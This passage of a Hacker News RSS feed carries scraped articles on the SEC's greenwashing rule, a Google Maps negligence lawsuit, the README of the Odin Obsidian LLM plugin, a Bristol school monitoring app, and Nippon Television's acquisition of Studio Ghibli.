            <title><![CDATA[The SEC cracks down on greenwashing (159 pts)]]></title>
            <link>https://www.semafor.com/article/09/21/2023/the-sec-cracks-down-on-greenwashing</link>
            <guid>37598329</guid>
            <pubDate>Thu, 21 Sep 2023 14:40:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.semafor.com/article/09/21/2023/the-sec-cracks-down-on-greenwashing">https://www.semafor.com/article/09/21/2023/the-sec-cracks-down-on-greenwashing</a>, See on <a href="https://news.ycombinator.com/item?id=37598329">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p><img width="30" height="30" src="https://img.semafor.com/eb687b94b93248efbff9e65b02568febf0405a45-2000x2127.png" alt="Jeronimo Gonzalez"><span>/</span></p><p><span>The U.S. Securities and Exchange Commission, the country’s top financial regulator, adopted a new rule to crack down on investment fund “greenwashing.”</span> Funds will be required to ensure that 80% of their portfolio match the asset advertised by the fund’s name. Since 2021, the SEC has prosecuted funds that bill themselves as investing exclusively in securities that rank highly in environmental, social, and governance measurements but which rather cast a much wider net with their investments. “<a href="https://www.ft.com/content/c626c311-7699-43b1-a98d-9740e06efc85" rel="no-referrer">It is truth in advertising,</a>” Gary Gensler, the SEC chair, said.</p></div><div><div><p><strong>The move was largely welcomed by activists and environmentalists, including some who had long considered the lax restrictions deceptive or even predatory of retail investors. </strong>“These rules will help cut down on greenwashing and misleading marketing so that millions of U.S. investors ensure … their money is being invested in line with their interests and their values,” a strategist at the Sierra Club, an environmental advocacy organization, said. “The SEC’s action today is a vital step,” the Environmental Defense Fund wrote.</p></div><div><figure><img width="800" height="607" src="https://img.semafor.com/aefe84b7e5a2af5f8ac552065f61a3c91ac02a03-1106x840.png?w=1600&amp;q=75&amp;auto=format" alt="" loading="lazy"></figure><p><strong>Despite a market downturn in 2022</strong> — during which traditional funds suffered billions of dollars in outflows — investors continued to flock to ESG funds, pushing their assets under management to a record $2.8 trillion last year. Demand has been driven largely by Europe<span>• <!-- -->1<!-- --> </span>, which accounted for 89% of sustainable funds’ assets. After years of out-performing traditional funds, however, sustainable funds’ returns fell below those of traditional ones last year, according to Morgan Stanley research.</p></div><div><p><strong>The EU is also cracking down on greenwashing.</strong> From 2026, products that can’t back up the accuracy of products marketed as being “climate neutral,” “eco,” or other sweeping environmental claims will be banned. The new rule, which climate NGOs have long agitated for, will make the EU the toughest region in the world in terms of green claims made to the public, the Financial Times reported. “Carbon neutral claims are greenwashing <span>• <!-- -->2<!-- --> </span>,” the head of a European consumer association said. “The truth is that these claims are scientifically incorrect and should never be used.”</p></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Google sued for negligence after man died following map directions (128 pts)]]></title>
            <link>https://apnews.com/article/google-maps-lawsuit-north-carolina-death-f4707247ee3295bf51bbcb37bd0eb6c8</link>
            <guid>37597207</guid>
            <pubDate>Thu, 21 Sep 2023 13:19:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://apnews.com/article/google-maps-lawsuit-north-carolina-death-f4707247ee3295bf51bbcb37bd0eb6c8">https://apnews.com/article/google-maps-lawsuit-north-carolina-death-f4707247ee3295bf51bbcb37bd0eb6c8</a>, See on <a href="https://news.ycombinator.com/item?id=37597207">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-module="" data-padding="none">
                    
                    
                        
                            

    <div><figure>
    

    
        <picture data-crop="medium-3x2">
    
        <source media="(min-width: 1280px)" type="image/webp" width="980" height="653" srcset="https://dims.apnews.com/dims4/default/2c99e55/2147483647/strip/true/crop/4500x2998+0+2/resize/980x653!/format/webp/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 1x" loading="lazy">

    

    
        <source media="(min-width: 1280px)" width="980" height="653" srcset="https://dims.apnews.com/dims4/default/c1575bb/2147483647/strip/true/crop/4500x2998+0+2/resize/980x653!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 1x" loading="lazy">

    

    
        <source media="(min-width: 1024px)" type="image/webp" width="820" height="546" srcset="https://dims.apnews.com/dims4/default/15bc497/2147483647/strip/true/crop/4500x2996+0+3/resize/820x546!/format/webp/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 1x" loading="lazy">

    

    
        <source media="(min-width: 1024px)" width="820" height="546" srcset="https://dims.apnews.com/dims4/default/2b16c66/2147483647/strip/true/crop/4500x2996+0+3/resize/820x546!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 1x" loading="lazy">

    

    
        <source media="(min-width: 768px)" type="image/webp" width="1024" height="683" srcset="https://dims.apnews.com/dims4/default/3b0f355/2147483647/strip/true/crop/4500x3001+0+1/resize/1024x683!/format/webp/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 1x" loading="lazy">

    

    
        <source media="(min-width: 768px)" width="1024" height="683" srcset="https://dims.apnews.com/dims4/default/fe2eefc/2147483647/strip/true/crop/4500x3001+0+1/resize/1024x683!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 1x" loading="lazy">

    

    
        <source media="(min-width: 600px)" type="image/webp" width="767" height="511" srcset="https://dims.apnews.com/dims4/default/be63112/2147483647/strip/true/crop/4500x2998+0+2/resize/767x511!/format/webp/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 1x,https://dims.apnews.com/dims4/default/4eb3b00/2147483647/strip/true/crop/4500x2998+0+2/resize/1534x1022!/format/webp/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 2x" loading="lazy">

    

    
        <source media="(min-width: 600px)" width="767" height="511" srcset="https://dims.apnews.com/dims4/default/fd70e96/2147483647/strip/true/crop/4500x2998+0+2/resize/767x511!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 1x,https://dims.apnews.com/dims4/default/832a8f7/2147483647/strip/true/crop/4500x2998+0+2/resize/1534x1022!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 2x" loading="lazy">

    

    
        <source media="(max-width: 599px)" type="image/webp" width="567" height="378" srcset="https://dims.apnews.com/dims4/default/4813c64/2147483647/strip/true/crop/4500x3000+0+2/resize/567x378!/format/webp/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 1x,https://dims.apnews.com/dims4/default/d7f616e/2147483647/strip/true/crop/4500x3000+0+2/resize/1134x756!/format/webp/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 2x" loading="lazy">

    

    
        <source media="(max-width: 599px)" width="567" height="378" srcset="https://dims.apnews.com/dims4/default/38bf924/2147483647/strip/true/crop/4500x3000+0+2/resize/567x378!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 1x,https://dims.apnews.com/dims4/default/a23ddc4/2147483647/strip/true/crop/4500x3000+0+2/resize/1134x756!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 2x" loading="lazy">

    

    
        <source type="image/webp" width="320" height="213" srcset="https://dims.apnews.com/dims4/default/1627617/2147483647/strip/true/crop/4500x2995+0+4/resize/320x213!/format/webp/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 1x,https://dims.apnews.com/dims4/default/4eaa70b/2147483647/strip/true/crop/4500x2995+0+4/resize/640x426!/format/webp/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 2x" loading="lazy">

    

    
        <source width="320" height="213" srcset="https://dims.apnews.com/dims4/default/edde91d/2147483647/strip/true/crop/4500x2995+0+4/resize/320x213!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 1x,https://dims.apnews.com/dims4/default/a795125/2147483647/strip/true/crop/4500x2995+0+4/resize/640x426!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 2x" loading="lazy">

    

    <img alt="FILE - The Google Maps app is seen on a smartphone, March 22, 2017, in New York. On Tuesday, Sept. 19, 2023, the family of a North Carolina man who died after driving his car off a collapsed bridge while following Google Maps directions filed a lawsuit against the technology giant for negligence, claiming it had been informed of the collapse but failed to update its navigation system. (AP Photo/Patrick Sison, File)" srcset="https://dims.apnews.com/dims4/default/edde91d/2147483647/strip/true/crop/4500x2995+0+4/resize/320x213!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 1x,https://dims.apnews.com/dims4/default/a795125/2147483647/strip/true/crop/4500x2995+0+4/resize/640x426!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616 2x" width="320" height="213" src="https://dims.apnews.com/dims4/default/edde91d/2147483647/strip/true/crop/4500x2995+0+4/resize/320x213!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F95%2F8d%2Fb3026e25edb067087ea9cca7fdaf%2Fc596b13599d44021a963fdea1fa02616" loading="lazy">
</picture>

    

    
        <div>
            <div><bsp-read-more data-more-button-text="Read More" data-less-button-text="Read Less" data-expand="ReadMore-expand" data-limit="110" data-main-class="ReadMore">
                    <figcaption><p>FILE - The Google Maps app is seen on a smartphone, March 22, 2017, in New York. On Tuesday, Sept. 19, 2023, the family of a North Carolina man who died after driving his car off a collapsed bridge while following Google Maps directions filed a lawsuit against the technology giant for negligence, claiming it had been informed of the collapse but failed to update its navigation system. (AP Photo/Patrick Sison, File)</p></figcaption>
                </bsp-read-more></div>
            <bsp-lead-superlead-ui></bsp-lead-superlead-ui>
        </div>
    
</figure>
</div>



                        
                    

                    <div>
                                        <p>RALEIGH, N.C. (AP) — The family of a North Carolina man who died after driving his car off a collapsed bridge while following Google Maps directions is suing the technology giant for negligence, claiming it had been informed of the collapse but failed to update its navigation system.</p><p>Philip Paxson, a medical device salesman and father of two, drowned Sept. 30, 2022, after his Jeep Gladiator plunged into Snow Creek in Hickory, according to a lawsuit filed Tuesday in Wake County Superior Court. Paxson was driving home from his daughter’s ninth birthday party through an unfamiliar neighborhood when Google Maps allegedly directed him to cross a bridge that had collapsed nine years prior and was never repaired.</p><p>“Our girls ask how and why their daddy died, and I’m at a loss for words they can understand because, as an adult, I still can’t understand how those responsible for the GPS directions and the bridge could have acted with so little regard for human life,” his wife, Alicia Paxson, said.</p>
    

<p>State troopers who found Paxton’s body in his overturned and partially submerged truck had said there were no barriers or warning signs along the washed-out roadway. He had driven off an unguarded edge and crashed about 20 feet below, according to the lawsuit.</p>



<p>The North Carolina State Patrol had said the bridge was not maintained by local or state officials, and the original developer’s company had dissolved. The lawsuit names several private property management companies that it claims are responsible for the bridge and the adjoining land.</p>

<p>Multiple people had notified Google Maps about the collapse in the years leading up to Paxson’s death and had urged the company to update its route information, according to the lawsuit. </p><p>The Tuesday court filing includes email records from another Hickory resident who had used the map’s “suggest an edit” feature in September 2020 to alert the company that it was directing drivers over the collapsed bridge. A November 2020 email confirmation from Google confirms the company received her report and was reviewing the suggested change, but the lawsuit claims Google took no further actions.</p><p>“We have the deepest sympathies for the Paxson family,” Google spokesperson José Castañeda told The Associated Press. “Our goal is to provide accurate routing information in Maps and we are reviewing this lawsuit.”</p><h2>___</h2><p>Hannah Schoenbaum is a corps member for the Associated Press/Report for America Statehouse News Initiative. <span><a href="https://www.reportforamerica.org/" target="_blank" rel="noopener">Report for America</a></span> is a nonprofit national service program that places journalists in local newsrooms to report on undercovered issues.</p>
                                    </div>

                    


                    
    <div>
    <div>
        <a href="https://apnews.com/author/hannah-schoenbaum">
            
                
                    <picture data-crop="small-square">
    
        <source type="image/webp" width="100" height="100" srcset="https://dims.apnews.com/dims4/default/367b1c3/2147483647/strip/true/crop/512x512+0+0/resize/100x100!/format/webp/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F0e%2F1c%2Fc98d3bd249588d758c40ecebad4c%2Fschoenbaum-hannah.jpeg" loading="lazy">

    

    
        <source width="100" height="100" srcset="https://dims.apnews.com/dims4/default/0f4b0d6/2147483647/strip/true/crop/512x512+0+0/resize/100x100!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F0e%2F1c%2Fc98d3bd249588d758c40ecebad4c%2Fschoenbaum-hannah.jpeg" loading="lazy">

    

    <img alt="HANNAH SCHOENBAUM" width="100" height="100" src="https://dims.apnews.com/dims4/default/0f4b0d6/2147483647/strip/true/crop/512x512+0+0/resize/100x100!/quality/90/?url=https%3A%2F%2Fassets.apnews.com%2F0e%2F1c%2Fc98d3bd249588d758c40ecebad4c%2Fschoenbaum-hannah.jpeg" loading="lazy">
</picture>

                
            
        </a>
    </div>

    <div>
        
            
        

        
            <p>
                Schoenbaum covers government and politics in North Carolina.
            </p>
        

        
            
        
    </div>
</div>



                    
    



                    
    


                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Odin – the integration of LLMs with Obsidian note taking (128 pts)]]></title>
            <link>https://github.com/memgraph/odin</link>
            <guid>37597201</guid>
            <pubDate>Thu, 21 Sep 2023 13:18:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/memgraph/odin">https://github.com/memgraph/odin</a>, See on <a href="https://news.ycombinator.com/item?id=37597201">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><p dir="auto"><a href="https://reactjs.org/" rel="nofollow"><img src="https://camo.githubusercontent.com/ea88da5714e4d0bb27afeb1a662a46e024ee7f1f8f8459dd4212adc75a2f5b23/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f52656163742d3631444246423f7374796c653d666f722d7468652d6261646765266c6f676f3d7265616374266c6f676f436f6c6f723d626c61636b" alt="react" data-canonical-src="https://img.shields.io/badge/React-61DBFB?style=for-the-badge&amp;logo=react&amp;logoColor=black"></a>
<a href="https://www.typescriptlang.org/" rel="nofollow"><img src="https://camo.githubusercontent.com/9e98eab478e098342c2933b383b774088b092bff05174f33637fa6307253e8ee/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f547970655363726970742d3331373843363f7374796c653d666f722d7468652d6261646765266c6f676f3d74797065736372697074266c6f676f436f6c6f723d7768697465" alt="typescript" data-canonical-src="https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&amp;logo=typescript&amp;logoColor=white"></a>
<a href="https://styled-components.com/" rel="nofollow"><img src="https://camo.githubusercontent.com/764d2c45635fde66c960fd6e024cd4dbd21c4dc8cf2160aa80aa0049f8632e22/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f7374796c65645f636f6d706f6e656e74732d4442373039333f7374796c653d666f722d7468652d6261646765266c6f676f3d7374796c6564636f6d706f6e656e7473266c6f676f436f6c6f723d7768697465" alt="styledcomponents" data-canonical-src="https://img.shields.io/badge/styled_components-DB7093?style=for-the-badge&amp;logo=styledcomponents&amp;logoColor=white"></a></p>
<p dir="auto"><a href="https://obsidian.md/" rel="nofollow"><img src="https://camo.githubusercontent.com/92d23a4981eec0df5192953800a52f3b1910e5a54c984afdaf82397cc3acf67b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6f6273696469616e2d3743334145443f7374796c653d666f722d7468652d6261646765266c6f676f3d6f6273696469616e266c6f676f436f6c6f723d7768697465" alt="obsidian" data-canonical-src="https://img.shields.io/badge/obsidian-7C3AED?style=for-the-badge&amp;logo=obsidian&amp;logoColor=white"></a>
<a href="https://www.docker.com/" rel="nofollow"><img src="https://camo.githubusercontent.com/b184cf7adbab9f5464e80c0f5dd32c85393f6248499a57d743e619f4214391c4/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f646f636b65722d3234393645443f7374796c653d666f722d7468652d6261646765266c6f676f3d646f636b6572266c6f676f436f6c6f723d7768697465" alt="docker" data-canonical-src="https://img.shields.io/badge/docker-2496ED?style=for-the-badge&amp;logo=docker&amp;logoColor=white"></a></p>
<h2 tabindex="-1" id="user-content-odin---obsidian-driven-information-network" dir="auto"><a href="#odin---obsidian-driven-information-network">ODIN - Obsidian Driven Information Network</a></h2>
<h2 tabindex="-1" id="user-content-disclaimer" dir="auto"><a href="#disclaimer">Disclaimer</a></h2>
<p dir="auto"><span>Warning</span><br>
It is recommended that you have access to GPT-4 via the OpenAI API. GPT-3.5 will probably fail to make correct knowledge graphs from your data.
Since we still don't have access to GPT-4 OpenAI API, although we made our account a month ago and generated &gt;1$ in billing a week ago,
the <code>init_repo</code>, <code>update_file</code> and <code>add_file</code> endpoints are still untested. We initialized knowledge graphs manually, through ChatGPT.
<strong>Here be dragons.</strong></p>
<h2 tabindex="-1" id="user-content-prerequisites" dir="auto"><a href="#prerequisites">Prerequisites</a></h2>
<p dir="auto">Before you begin, make sure you have the following:</p>
<ul dir="auto">
<li>Obsidian installed on your system.</li>
<li>An active Obsidian vault.</li>
</ul>
<h2 tabindex="-1" id="user-content-installation" dir="auto"><a href="#installation">Installation</a></h2>
<ol dir="auto">
<li>
<p dir="auto"><strong>Download the Plugin:</strong></p>
<ul dir="auto">
<li>Clone the repository inside the plugins folder (your_vault/.obsidian/plugins) using Git:
<div data-snippet-clipboard-copy-content="git clone https://github.com/memgraph/odin.git"><pre><code>git clone https://github.com/memgraph/odin.git
</code></pre></div>
</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Install Dependencies and Start the Plugin:</strong></p>
<ul dir="auto">
<li>
<p dir="auto">Open your terminal or command prompt.</p>
</li>
<li>
<p dir="auto">Navigate to the plugin's root directory:</p>

</li>
<li>
<p dir="auto">You have the option to install ODIN using Docker, which will automatically install, set up and run the Memgraph database, the backend, and frontend components, or you can manually run the project locally for a more customized setup or if you already have Memgraph up and running.</p>
<h3 tabindex="-1" id="user-content-docker-installation" dir="auto"><a href="#docker-installation">Docker installation</a></h3>
<p dir="auto">Before you start, make sure you have a running <a href="https://www.docker.com/" rel="nofollow">Docker</a> instance and <a href="https://docs.docker.com/compose/install/" rel="nofollow">Docker compose</a> installed.</p>
<ol dir="auto">
<li>You will need to create a <code>.env</code> file inside the ODIN folder with your OpenAI API key to access the app features. It should look like this:</li>
</ol>
<div data-snippet-clipboard-copy-content="OPENAI_API_KEY=YOUR_API_KEY"><pre><code>OPENAI_API_KEY=YOUR_API_KEY
</code></pre></div>
<p dir="auto">Where YOUR_API_KEY is a key you can get <a href="https://openai.com/" rel="nofollow">here</a>.</p>
<ol start="2" dir="auto">
<li>Run:</li>
</ol>

<p dir="auto">It will take up to ten minutes to download and run all dependencies. Now, that you have ODIN successfully installed, you can go to the next step.</p>
<h3 tabindex="-1" id="user-content-manual-installation" dir="auto"><a href="#manual-installation">Manual installation</a></h3>
<p dir="auto">Make sure you have <a href="https://nodejs.org/en/download/current" rel="nofollow">Node.js</a> version 14 or above and <a href="https://docs.npmjs.com/downloading-and-installing-node-js-and-npm" rel="nofollow">npm</a> installed.</p>
<ol dir="auto">
<li>Install the required Node.js dependencies:</li>
</ol>

<ol start="2" dir="auto">
<li>Start the development build:</li>
</ol>

<p dir="auto">You now have the app frontend up and running.</p>
<ol start="3" dir="auto">
<li>You will also need to run the <a href="https://memgraph.com/docs/memgraph/installation" rel="nofollow">Memgraph</a> database and the application backend by following the installation steps for <a href="https://github.com/memgraph/bor">BOR</a> - backend for Obsidian and Rune.</li>
</ol>
</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Disable Restricted Mode:</strong></p>
<ul dir="auto">
<li>In the Obsidian settings, navigate to "Options."</li>
<li>Click on the "Community plugins" tab.</li>
<li>Click the "Turn on community plugins" button.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Enable the Plugin:</strong></p>
<ul dir="auto">
<li>If you don't see ODIN in the list, try reloading Obsidian.</li>
<li>Navigate back to the "Community plugins" section in the Obsidian settings.</li>
<li>Find "ODIN" in the list of plugins.</li>
<li>Toggle the switch next to the plugin name to enable it.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Plugin Usage:</strong></p>
<ul dir="auto">
<li>The ODIN plugin is now installed and active. You can access its features through the Obsidian interface.</li>
</ul>
</li>
</ol>
<h2 tabindex="-1" id="user-content-features" dir="auto"><a href="#features">Features</a></h2>
<p dir="auto">Most features are accessible through the <code>Graph Prompt view</code> button in the menu opened by clicking the <code>Expand</code> button in the right upper corner of Obsidian.</p>
<ol dir="auto">
<li>Prompt Bar for LLM Queries</li>
</ol>
<ul dir="auto">
<li>ODIN integrates Large Language Models (LLMs) into Obsidian using LangChain, allowing you to ask questions about the data stored in your knowledge graph right from the prompt bar.</li>
</ul>
<ol start="2" dir="auto">
<li>Graph Visualization</li>
</ol>
<ul dir="auto">
<li><code>Vault view</code> will give you a comprehensive understanding of your notes and knowledge by visualizing your entire Obsidian vault as a dynamic knowledge graph.</li>
<li>Switch between <code>Vault view</code> and <code>File view</code> to get a detailed visualization of specific files.</li>
<li>By clicking nodes in the <code>File view</code> you will get highlighted sentences thematically connected to that node in your editor.</li>
</ul>
<ol start="3" dir="auto">
<li>Dropdown Menu Functions</li>
</ol>
<p dir="auto">Right click on the highlighted text in the editor to access the following features:</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Generate questions</strong>: Extract thought-provoking questions from your markdown files, encouraging deeper contemplation and critical thinking.</p>
</li>
<li>
<p dir="auto"><strong>Link prediction</strong>: Automatically generate links to other markdown files in your vault that are thematically connected to the highlighted text, enriching your notes with relevant references.</p>
</li>
<li>
<p dir="auto"><strong>Node suggestion</strong>: Access thematically connected nodes related to the highlighted text, fostering meaningful connections and comprehensive understanding of your information.</p>
</li>
</ul>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Call to shut down Bristol schools’ use of app to ‘monitor’ pupils and families (156 pts)]]></title>
            <link>https://www.theguardian.com/education/2023/sep/21/calls-to-shut-down-bristol-schools-use-of-think-family-education-app-pupils-and-families</link>
            <guid>37597165</guid>
            <pubDate>Thu, 21 Sep 2023 13:16:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theguardian.com/education/2023/sep/21/calls-to-shut-down-bristol-schools-use-of-think-family-education-app-pupils-and-families">https://www.theguardian.com/education/2023/sep/21/calls-to-shut-down-bristol-schools-use-of-think-family-education-app-pupils-and-families</a>, See on <a href="https://news.ycombinator.com/item?id=37597165">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="maincontent"><p>Criminal justice and antiracist campaigners have raised concerns over an app being used by schools in <a href="https://www.theguardian.com/uk/bristol" data-link-name="in body link" data-component="auto-linked-tag">Bristol</a> to “monitor and profile” pupils and their families.</p><p>The app, which is being used by more than 100 schools, gives safeguarding leads quick, easy access to pupils’ and their families’ contacts with police, child protection and welfare services.</p><p>One of the concerns campaigners have is that the Think Family Education (TFE) app includes analysing which children could be at risk of exposure to criminality, which they argue risks leading to more discrimination against pupils from minority ethnic or working-class backgrounds.</p><p>Staff using the app have told <a href="https://www.fairtrials.org/" data-link-name="in body link">the criminal justice campaign charity Fair Trials</a> that they keep it secret from parents and carers, and admitted many would be concerned about it if they knew of it.</p><p>Bristol city council and Avon and Somerset police, who worked together on the system, insist it is in place to protect children, not criminalise them, and deny it is secret, pointing out that <a href="https://www.bristol.gov.uk/residents/social-care-and-health/children-and-families/insight-bristol" data-link-name="in body link">information about its existence is publicly available</a>.</p><p>But Fair Trials said the vast majority of parents would know nothing about the app. Griff Ferris, the charity’s senior legal and policy officer, said: “Schoolchildren should not be monitored, profiled and criminalised by secretive police databases. Surveillance is not safeguarding.</p><p>“Systems like this uphold existing discrimination against children and families from minoritised ethnic and more deprived backgrounds. This system is expanding the net of surveillance. It should be shut down.”</p><p>A spokesperson for <a href="https://www.nomoreexclusions.com/" data-link-name="in body link">the antiracist organisation No More Exclusions Bristol</a> said: “Technologies that gather and use information in the name of ‘public safety’ overwhelmingly reproduce racialised ideas of problematic behaviour.”</p><p>Liz Fekete, the director of the Institute of Race Relations, strongly criticised elements of the app, saying the approach “stigmatises whole families and leaves even primary school children vulnerable to police surveillance and intelligence gathering”.</p><p>When it was consulted, the Bristol City Youth Council, an elected group of young people, expressed reservations that if the system was not used properly it could lead to “prejudice and judgment”.</p><p>Systems to collate information about children are used in other parts of England but Bristol city council describes Think Family as “innovative” and a number of local authorities are watching how the app works.</p><p>On its website, the council says the <a href="https://www.bristol.gov.uk/residents/social-care-and-health/children-and-families/insight-bristol" data-link-name="in body link">Think Family database</a>, which the app draws on, includes information from about 50,000 families across the city collected from agencies including social care, police and the Department for Work and Pensions. It says it highlights “vulnerabilities or needs” and uses “targeted analytics” to help identify children at risk of sexual or criminal exploitation.</p><p>Critics say the reality is that this risks children from minority ethnic or poorer backgrounds being profiled as being involved in gangs or county lines operations.</p><p>Schools using the TFE app receive alerts about children’s and family members’ contact with police, antisocial behaviour and domestic violence incidents. The system also gives schools access to sensitive personal details about families’ financial situations.</p><p>School safeguarding leads told Fair Trials that they kept the system secret from children and their families. One said: “They [parents and carers] wouldn’t know about this ... parents will have no kind of sight of it at all ... They just don’t know of its existence.”</p><p>They described the system as “an early warning process” and admitted: “I think there’s a bit of a risk it getting out there that schools hold this kind of central bank of information.”</p><p>A spokesperson for Bristol city council said the Think Family database was introduced to counter the trend of agencies working in silos at a time of a “generational squeeze” on public finances.</p><p>The spokesperson said: “The introduction of the Think Family Education app means that schools … have access to appropriate information in a secure and restricted way to make decisions about how they support children. There are strict controls in place about who can access this information, how they do this and the reasons why.”</p><p>A spokesperson for Avon and Somerset police said the database gave professionals working with children joined-up information to identify and safeguard those at risk of criminal and sexual exploitation.</p><p>“The TFE app gives professionals immediate access to this information, helping them to act swiftly on any identified risks.” The spokesperson said neither the app or database assessed the likelihood of an individual to commit a crime.</p><p>The force said “robust privacy and sharing agreements” had been approved by <a href="https://ico.org.uk/" data-link-name="in body link">the Information Commissioner’s Office</a> and development of the system done in collaboration with the <a href="https://www.gov.uk/government/organisations/centre-for-data-ethics-and-innovation" data-link-name="in body link">Centre for Data Ethics and Innovation</a>.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Nippon Television has just acquired Studio Ghibli (516 pts)]]></title>
            <link>https://www.catsuka.com/breves/2023-09-21/nippon-television-rachete-le-studio-ghibli</link>
            <guid>37596788</guid>
            <pubDate>Thu, 21 Sep 2023 12:44:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.catsuka.com/breves/2023-09-21/nippon-television-rachete-le-studio-ghibli">https://www.catsuka.com/breves/2023-09-21/nippon-television-rachete-le-studio-ghibli</a>, See on <a href="https://news.ycombinator.com/item?id=37596788">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><strong>Nippon Television</strong> vient de racheter le <strong>Studio Ghibli</strong>, qui deviendra une filiale de leur soci�t�.</p><p>

Le producteur Toshio Suzuki (75 ans) cherchait un successeur, il a propos� Goro Miyazaki, mais Hayao Miyazaki (82 ans) a refus� (et Goro Miyazaki aussi).</p><p>

Nippon Television, qui d�tiendra d�sormais 42,3% des droits de vote, �tait d�j� un partenaire de longue date de Ghibli, notamment � travers la case TV "Friday Road Show", qui diffuse les films du studio sur la cha�ne depuis Nausicaa.</p><a href="https://pbs.twimg.com/media/F6iDsiSWsAAPJZY?format=jpg&amp;name=large" target="_blank"><center><img src="https://pbs.twimg.com/media/F6iDsiSWsAAPJZY?format=jpg&amp;name=small"></center></a><p>

From <a href="https://twitter.com/catsuka/status/1704757264324665345" target="_blank">Catsuka on Twitter</a> :</p><center>

<blockquote><p lang="en" dir="ltr">Nippon Television has just acquired Studio Ghibli.<br>Producer Toshio Suzuki (75) was looking for a successor, and proposed Goro Miyazaki, but Hayao Miyazaki (85) refused (and so did Goro).<br>And Nippon Television was an old Ghibli's partner (Friday Road Show).<a href="https://t.co/EX4jsKXrkP">https://t.co/EX4jsKXrkP</a> <a href="https://t.co/n0TkyTxeZS">pic.twitter.com/n0TkyTxeZS</a></p>� Catsuka 💙 (@catsuka) <a href="https://twitter.com/catsuka/status/1704757264324665345?ref_src=twsrc%5Etfw">September 21, 2023</a></blockquote>

</center><p>

